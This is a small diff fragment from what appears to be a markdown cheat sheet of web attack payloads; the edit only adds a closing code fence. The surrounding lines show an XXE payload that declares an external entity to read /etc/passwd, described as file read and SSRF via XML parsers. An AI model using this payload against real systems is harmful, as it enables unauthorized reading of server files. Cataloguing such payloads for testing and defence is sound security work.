@@ -75,7 +75,7 @@
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <foo>&xxe;</foo>
-
+```
     Exploit file read, SSRF via XML parsers
 
 ## 14. Path Traversal
